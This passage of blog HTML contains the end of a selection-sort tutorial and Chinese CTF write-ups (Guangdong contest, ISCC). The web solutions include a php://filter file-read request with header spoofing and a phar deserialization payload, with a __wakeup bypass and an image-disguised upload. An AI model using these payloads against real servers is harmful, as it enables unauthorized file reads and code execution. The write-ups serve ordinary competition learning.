+<li>当 ( i = 1 )，内层循环进行 ( n - 2 ) 次比较操作。</li>
+<li>依此类推，直到 ( i = n - 2 )，内层循环进行 1 次比较操作。</li>
+</ul>
+</li>
+</ul>
+<p>总比较次数为：</p>
+<script type="math/tex; mode=display">
+(n - 1) + (n - 2) + \ldots + 2 + 1 = \frac{n(n - 1)}{2}</script><p>因此，总时间复杂度为 ( O(n^2) )。</p>
+<h3 id="2-空间复杂度"><a href="#2-空间复杂度" class="headerlink" title="2. 空间复杂度"></a>2. 空间复杂度</h3><p>选择排序的空间复杂度为 ( O(1) )。它只使用了固定的额外空间来存储交换操作，并不依赖于输入数组的大小。</p>
+<h2 id="五、算法的优点"><a href="#五、算法的优点" class="headerlink" title="五、算法的优点"></a>五、算法的优点</h2><ol>
+<li><strong>简单易懂</strong>：选择排序是一种简单直观的排序算法，容易理解和实现。</li>
+<li><strong>原地排序</strong>：选择排序不需要额外的存储空间，只使用原始数组进行排序。</li>
+<li><strong>适用于小型数组</strong>：对于小型数组，选择排序的性能表现较好。</li>
+</ol>
+<h2 id="六、算法的缺点"><a href="#六、算法的缺点" class="headerlink" title="六、算法的缺点"></a>六、算法的缺点</h2><ol>
+<li><strong>时间复杂度高</strong>：在处理大规模数据时效率较低。</li>
+<li><strong>不稳定</strong>：选择排序在排序过程中可能会改变相同元素的相对顺序，因此它是一种不稳定的排序算法。</li>
+</ol>
+<h2 id="七、优化方案"><a href="#七、优化方案" class="headerlink" title="七、优化方案"></a>七、优化方案</h2><p>选择排序的时间复杂度为 ( O(n^2) )，在处理大规模数据时效率较低。可以考虑以下优化方案：</p>
+<ol>
+<li><p><strong>使用线段树</strong>：每一个内层循环是从一个区间中找到一个最小值，并且更新这个最小值。这个过程可以通过使用线段树将时间复杂度优化为 ( O(\log n) )，从而使总的时间复杂度变为 ( O(n \log n) )。</p>
+</li>
+<li><p><strong>堆排序</strong>：堆排序是一种更为高效的选择排序优化方法，后续可以进一步学习和应用。</p>
+</li>
+</ol>
+<p>通过以上优化，可以显著提升选择排序在大规模数据处理中的性能。</p>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/05/27/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/05/27/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP/" class="post-title-link" itemprop="url">广东省大学生网络安全竞赛WP</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-05-27 15:16:46 / 修改时间：15:15:41" itemprop="dateCreated datePublished" datetime="2024-05-27T15:16:46+08:00">2024-05-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">广东省大学生网络安全竞赛</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="广东省大学生网络安全竞赛WP"><a href="#广东省大学生网络安全竞赛WP" class="headerlink" title="广东省大学生网络安全竞赛WP"></a>广东省大学生网络安全竞赛WP</h1><h2 id="001-消失的flag"><a href="#001-消失的flag" class="headerlink" title="001. 消失的flag"></a>001. 消失的flag</h2><p>使用 php:// 伪协议的convert编码格式转换功能读取flag<br>使用header绕过IP检测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(url, params=&#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;php://filter/convert.iconv.UCS-4.UCS-4/resource=/flag&quot;</span>&#125;, headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<h2 id="003-unserialize-web"><a href="#003-unserialize-web" class="headerlink" title="003. unserialize_web"></a>003. unserialize_web</h2><p>扫描看到源码www.tar.gz，使用phar反序列化读取/flag，需要绕过__wakeup关键字检测、文件后缀检测、phar反序列化。生成恶意对象放入phar.phar：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 反序列化payload构造</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$val1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$val2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$val3</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val1 = <span class="string">&quot;val1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val2 = <span class="string">&quot;val2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;val1 === <span class="string">&quot;file&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;val2 === <span class="string">&quot;exists&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\s*system\s*\(\s*\&#x27;cat\s+\/[^;]*\&#x27;\s*\);\s*$/&#x27;</span> <span class="variable">$this</span>-&gt;val3)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;val3);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__access</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$Var</span> = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$Var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val1 = <span class="string">&quot;exists&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val2 = <span class="string">&quot;file&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件存在&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;val1=<span class="string">&#x27;file&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;val2=<span class="string">&#x27;exists&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;val3=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开phar文件</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">// 生成时后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 放入对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加压缩的文件（test为其中的内容）</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;use phar.phar&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>修改phar.phar绕过__wakeup：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sha1_hash</span>(<span class="params">s</span>):</span><br><span class="line">    sha1_obj = hashlib.sha1()</span><br><span class="line">    sha1_obj.update(s)</span><br><span class="line">    <span class="keyword">return</span> sha1_obj.digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;php_docker/phar.phar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    content = content.replace(<span class="string">b&#x27;&quot;File&quot;:3&#x27;</span>, <span class="string">b&#x27;&quot;File&quot;:4&#x27;</span>)</span><br><span class="line">    content = content[:-<span class="number">28</span>] + sha1_hash(content[:-<span class="number">28</span>]) + content[-<span class="number">8</span>:]</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;php_docker/modified.phar&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    out.write(content)</span><br></pre></td></tr></table></figure>
+<p>使用gzip -f modified.phar压缩绕过关键字检测，得到modified.phar.gz，重命名为mod3.jpg绕过文件后缀检测并上传。最后触发，拿到flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://1c300fa3-159a-bef7-2fd1-6e7839227374b834.tq.jxsec.cn:30486/download.php&quot;</span></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;phar://upload/mod3.jpg/test.jpg&quot;</span>&#125;)</span><br><span class="line">r.encoding = r.apparent_encoding</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="002-re2"><a href="#002-re2" class="headerlink" title="002. re2"></a>002. re2</h3><p>IDA查看main函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_401170(<span class="string">&quot;you win: please the key decrypt flag.\r\n&quot;</span>);</span><br><span class="line">sub_401170(<span class="string">&quot;flag:uQBF11zD6uYP9kJhRhL8OeesPaaZQQvbl3wx7Ik0T6g=. alg=AES\r\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>使用findcrypt插件找到CRC32。<img src="https://s2.loli.net/2024/05/27/fNpqBO3WGlLzRra.png" alt="image-20240527144807827"></p>
+<p>crc32和算法解出key：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rand1-key：28672 12779520 1744830464 129 13824</span><br><span class="line">rand2-key：2 9 10 14 5</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/05/27/neJZQvC6DciIAKL.png" alt="image-20240527144822061"></p>
+<p><img src="https://s2.loli.net/2024/05/27/KPoR47r5yHbfMYw.png" alt="image-20240527144828947"></p>
+<p>从内存里面dump出来16byte，获得真key。base64解密得到flag。</p>
+<p><img src="https://s2.loli.net/2024/05/27/ZQnXvAR4oBrGDPu.png" alt="image-20240527144837259"></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="001-猜一猜"><a href="#001-猜一猜" class="headerlink" title="001. 猜一猜"></a>001. 猜一猜</h3><p><img src="https://s2.loli.net/2024/05/27/Qr6njVPBoRiYEZk.png" alt="image-20240527144844608"></p>
+<p>压缩包有密码，观察文件名像md5：<a target="_blank" rel="noopener" href="https://www.cmd5.com/。附件文件名MD5解密得到密码：a1478520。">https://www.cmd5.com/。附件文件名MD5解密得到密码：a1478520。</a></p>
+<p><img src="https://s2.loli.net/2024/05/27/VTHfMB5AJDX9R6t.png" alt="image-20240527144851817"></p>
+<p><img src="https://s2.loli.net/2024/05/27/CuBeNLIrmZavjQz.png" alt="image-20240527144855779"></p>
+<p>使用010editor打开，补全PNG文件头得到一个二维码。扫码转到网站：</p>
+<p><img src="https://s2.loli.net/2024/05/27/tF3ofXVnDsWMQcB.png" alt="image-20240527144904113"></p>
+<p><img src="https://s2.loli.net/2024/05/27/7UhWoPqRIVl1dCn.png" alt="image-20240527144908308"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❀❁❀❇❀✼❀❂✿❆✿✽❁❀✿✾❂❅✿❄❂❉❀✿❂❆❀❃❀✿❂❆✿❀❁✾✻✿❁❁❀❁❂❊✻❂✿❈=</span><br></pre></td></tr></table></figure>
+<p>花朵密码，在线解密<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo</a></p>
+<p><img src="https://s2.loli.net/2024/05/27/SaJGhKCLNUBFIM1.png" alt="image-20240527144914451"></p>
+<p>得到flag{rUsJyNdKhdKuS4VfO7}。</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="001-encipher"><a href="#001-encipher" class="headerlink" title="001. encipher"></a>001. encipher</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="number">4885628697024674802233453512637565599092248491488767824821990279922756927662223348312748794983451796542248787267207054348962258716585568185354414099671493917947012747791554070655258925730967322717771647407982984792632771150018212620323323635510053326184087327891569331050475507897640403090397521797022070233</span></span><br><span class="line">N = <span class="number">89714050971394259600440975863751229102748301873549839432714703551498380713981264101533375672970154214062583012365073892089644031804109941766201243163398926438698369735588338279544152140859123834763870759757751944228350552806429642516747541162527058800402619575257179607422628877017180197777983487523142664487</span></span><br><span class="line">ciphertext = <span class="number">67254133265602132458415338912590207677514059205474875492945840960242620760650527587490927820914970400738307536068560894182603885331513473363314148815933001614692570010664750071300871546575845539616570277302220914885734071483970427419582877989670767595897758329863040523037547687185382294469780732905652150451</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(ciphertext, d, N)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line">l = <span class="built_in">len</span>(m)</span><br><span class="line">key = <span class="string">b&#x27;Life is like an ocean only strong-minded can reach the other shore&#x27;</span></span><br><span class="line">key = key[:l]</span><br><span class="line">m = strxor(m, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m, l)</span><br></pre></td></tr></table></figure>
+<p>得到flag{1s_Pa33w0rd_1y2u22}</p>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/05/10/ISSC/ssXl9SF0HvBbMAtG/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/05/10/ISSC/ssXl9SF0HvBbMAtG/" class="post-title-link" itemprop="url">ISCC-1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-05-10 22:51:41 / 修改时间：18:42:49" itemprop="dateCreated datePublished" datetime="2024-05-10T22:51:41+08:00">2024-05-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISCC/" itemprop="url" rel="index"><span itemprop="name">ISCC</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="/pic/36.png" alt="36"></p>
+<h2 id="1、迷失之门"><a href="#1、迷失之门" class="headerlink" title="1、迷失之门"></a>1、迷失之门</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_simulate_check</span>(<span class="params">transformed_string</span>):</span><br><span class="line"></span><br><span class="line">​    v16 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>  <span class="comment"># 大写字母</span></span><br><span class="line">​    v10 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>  <span class="comment"># 小写字母</span></span><br><span class="line">​    v4 = <span class="string">&quot;0123456789+/-=!#&amp;*()?;:^%&quot;</span>    <span class="comment"># 特殊字符和数字</span></span><br><span class="line">​    v3 = <span class="string">&quot;DABBZXQESVFRWNGTHYJUMKIOLPC&quot;</span>  <span class="comment"># 转换基准</span></span><br><span class="line"></span><br><span class="line">​    possible_inputs = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历转换后的字符串</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(transformed_string)):</span><br><span class="line">​        transformed_char = transformed_string[i]</span><br><span class="line">​        current_v3_char = v3[i % <span class="built_in">len</span>(v3)]</span><br><span class="line">​        possible_chars = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查 v16</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(v16):</span><br><span class="line">​            <span class="keyword">if</span> char == transformed_char:</span><br><span class="line">​                original_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(current_v3_char) + index)</span><br><span class="line">​                <span class="keyword">if</span> <span class="number">32</span> &lt; <span class="built_in">ord</span>(original_char) != <span class="number">127</span>:</span><br><span class="line">​                    possible_chars.append(original_char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查 v10</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(v10):</span><br><span class="line">​            <span class="keyword">if</span> char == transformed_char:</span><br><span class="line">​                original_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(current_v3_char) + index + <span class="number">26</span>)</span><br><span class="line">​                <span class="keyword">if</span> <span class="number">32</span> &lt; <span class="built_in">ord</span>(original_char) != <span class="number">127</span>:</span><br><span class="line">​                    possible_chars.append(original_char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查 v4</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(v4):</span><br><span class="line">​            <span class="keyword">if</span> char == transformed_char:</span><br><span class="line">​                original_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(current_v3_char) + index + <span class="number">52</span>)</span><br><span class="line">​                <span class="keyword">if</span> <span class="number">32</span> &lt; <span class="built_in">ord</span>(original_char) != <span class="number">127</span>:</span><br><span class="line">​                    possible_chars.append(original_char)</span><br><span class="line"></span><br><span class="line">​        possible_inputs.append(possible_chars)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> possible_inputs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已转换后的字符串</span></span><br><span class="line"></span><br><span class="line">transformed_string = <span class="string">&quot;FSBBhKrVSGeafuZDJkuYqROaYY6&quot;</span></span><br><span class="line">original_input_possibilities = reverse_simulate_check(transformed_string)</span><br><span class="line"><span class="keyword">for</span> i, possibilities <span class="keyword">in</span> <span class="built_in">enumerate</span>(original_input_possibilities):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Character position <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> possible originals: <span class="subst">&#123;possibilities&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<hr>
+<p>得到flag ISCC{b|Ze\dlv|`WQ}xmw\Widh}</p>
+<p><img src="/pic/37.png" alt="37"></p>
+<ol>
+<li><p><strong>函数声明</strong>：这是<code>main</code>函数的入口，采用标准的C++形式，接收命令行参数。</p>
+</li>
+<li><p>关键逻辑分析</p>
+<ul>
+<li><pre><code>if (strlen(Buffer) &lt;= 0x1B)
+</code></pre><p>：这个条件检查输入的长度是否小于等于27个字符。</p>
+<ul>
+<li><p>如果是，进入循环检查Buffer中的字符：</p>
+<ul>
+<li>循环从索引5到25，检查字符是否是小写字母或下划线（<code>islower(Buffer[i]) || Buffer[i] == &#39;_&#39;</code>）。如果不是，<code>v7</code>设为0。</li>
+<li>调用<code>check(Buffer)</code>函数，此函数可能是用来检查<code>Buffer</code>中是否包含有效的flag。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>如果输入长度超过27个字符，输出一条错误消息并暂停。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h2><p><img src="/pic/38.png" alt="38"></p>
+<p>初始化了三个字符数组：</p>
+<ul>
+<li><code>v16</code> 存储大写字母 A-Z。</li>
+<li><code>v10</code> 存储小写字母 a-z。</li>
+<li><code>v4</code> 存储数字和特殊字符。</li>
+<li><p><code>v3</code> 存储了一个特定的字母序列 “DABBZXQESVFRWNGTHYJUMKIOLPC”，看起来像是一个密钥或映射。</p>
+</li>
+<li><p>循环遍历输入字符串 a1</p>
+<p>，对每个字符进行检查和变换：</p>
+<ul>
+<li>跳过ASCII值为127和小于等于32的字符（控制字符和空白）。</li>
+<li>对于其他字符，根据与v3中对应位置字符的差值，进行替换：<ul>
+<li>如果差值小于或等于0，输出”flag is wrong”。</li>
+<li>如果差值在1到25之间，使用 <code>v16</code>（大写字母）中对应的字符替换。</li>
+<li>如果差值在26到51之间，使用 <code>v10</code>（小写字母）中对应的字符替换。</li>
+<li>如果差值大于51，使用 <code>v4</code>（数字和特殊字符）中对应的字符替换。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h2><p><img src="/pic/39.png" alt="39"></p>
+<p>验证输出，这里相当于直接告诉你flag要求了，写个脚本秒了</p>
+<p>transformed_string = “FSBBhKrVSGeafuZDJkuYqROaYY6”</p>
+<p><img src="../pic/image-20240510231929311.png" alt="image-20240510231929311"></p>
+<p><img src="/image-20240510232036513.png" alt="image-20240510232036513"></p>
